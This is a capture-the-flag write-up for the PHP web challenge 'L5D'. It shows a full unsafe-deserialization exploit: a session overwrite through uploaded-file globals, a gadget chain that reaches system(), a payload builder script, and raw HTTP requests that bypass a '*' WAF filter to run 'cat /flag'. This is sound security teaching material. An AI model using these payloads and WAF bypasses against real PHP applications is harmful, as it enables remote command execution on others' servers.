# L5D (web, 471p, 17 solves)

L5D is a PHP challenge that contains an unsafe deserialization vulnerability as a feature.

There are 5 classes present in the source code:
- `L5D_Upload` allows the user to overwrite global variables with the content of the `$_FILES` array
```php
foreach ($_FILES as $key => $value)
    $GLOBALS[$key] = $value;
```

- `L5D_Login::__wakeup` sets `$_SESSION['name']` to "wubalubadubdub" if the hash of /flag is provided
- `L5D_SayMyName` prints `$_SESSION['name']`
- `L5D_ResetCMD` sets global variable `$cmd`
- `L5D_Command` execute `$cmd` with `system`

`$_SESSION['name']` can be overwritten to `wubalubadubdub` with the following request:
```
POST /test.php HTTP/1.1
Host: 35.194.175.80:8000
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.193 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryHSJdBIRyR3O8F6VC
Content-Length: 400

------WebKitFormBoundaryHSJdBIRyR3O8F6VC
Content-Disposition: form-data; name="l5d_file"; filename="xxx"

GIF89aaaaaa
------WebKitFormBoundaryHSJdBIRyR3O8F6VC
Content-Disposition: form-data; name="_SESSION"; filename="wubalubadubdub"

x
------WebKitFormBoundaryHSJdBIRyR3O8F6VC--

```

It is possible to make a gadget chain that executes `ls -al` locally with the following script :

```php
<?php

class L5D_Command {
    function __construct() {
    }
}

class L5D_ResetCMD {
    private $new_cmd;

    function __construct() {
        $this->new_cmd = 'ls -al';
        $this->v = new L5D_Command;
    }

}

class L5D_Upload {
    function __construct() {
        $this->x = new L5D_ResetCMD;
    }
}

echo urlencode(serialize([new L5D_Upload]));
```

```
POST /ex.php?%3f=a%3A1%3A%7Bi%3A0%3BO%3A10%3A%22L5D_Upload%22%3A1%3A%7Bs%3A1%3A%22x%22%3BO%3A12%3A%22L5D_ResetCMD%22%3A2%3A%7Bs%3A21%3A%22%00L5D_ResetCMD%00new_cmd%22%3Bs%3A2%3A%22id%22%3Bs%3A1%3A%22v%22%3BO%3A11%3A%22L5D_Command%22%3A0%3A%7B%7D%7D%7D%7D HTTP/1.1
Host: 35.194.175.80:8000
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.193 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryHSJdBIRyR3O8F6VC
Content-Length: 289

------WebKitFormBoundaryHSJdBIRyR3O8F6VC
Content-Disposition: form-data; name="l5d_file"; filename="xxx"

GIF89aaaaaa
------WebKitFormBoundaryHSJdBIRyR3O8F6VC
Content-Disposition: form-data; name="_SESSION"; filename="wubalubadubdub"

x
------WebKitFormBoundaryHSJdBIRyR3O8F6VC--

```

This works in local (php 7.4) but this challenge uses php 7.0.33.
php 7.0 does not consider private variables as equivalent to protected variables during unserialization.


```
docker run -d -p 8080:80 --rm --name oldphp -v "$PWD":/var/www/html php:7.0.33-apache
```

Unfortunately, declaring `L5D_ResetCmd::$new_cmd` as a protected variable makes the request blocked by the WAF because of the `*`.
PHP stores protected variable as `\x00*\x00<variable>` and private variables as `\x00<class>\x00<variable>`.

```php
function waf($s) {
    if(stripos($s, "*") !== FALSE)
        return false;
    return true;
}
```

It is possible to bypass the WAF by using the `S` representation of strings in serialized form (https://github.com/ambionics/phpggc#ascii-strings)

```
POST /index.php?%3f=a%3A1%3A%7Bi%3A0%3BO%3A10%3A%22L5D_Upload%22%3A1%3A%7Bs%3A1%3A%22x%22%3BO%3A12%3A%22L5D_ResetCMD%22%3A3%3A%7BS:10:"\00\2a%00new_cmd";s:9:"cat%20/flag";s%3A1%3A%22x%22%3BO%3A13%3A%22L5D_SayMyName%22%3A0%3A%7B%7Ds%3A1%3A%22v%22%3BO%3A11%3A%22L5D_Command%22%3A0%3A%7B%7D%7D%7D%7D%27%3B HTTP/1.1
Host: 35.194.175.80:8000
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.193 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryHSJdBIRyR3O8F6VC
Content-Length: 291

------WebKitFormBoundaryHSJdBIRyR3O8F6VC
Content-Disposition: form-data; name="l5d_file"; filename="xxx"

GIF89aaaaaa
------WebKitFormBoundaryHSJdBIRyR3O8F6VC
Content-Disposition: form-data; name="_SESSION"; filename="wubalubadubdub"

x
------WebKitFormBoundaryHSJdBIRyR3O8F6VC--

```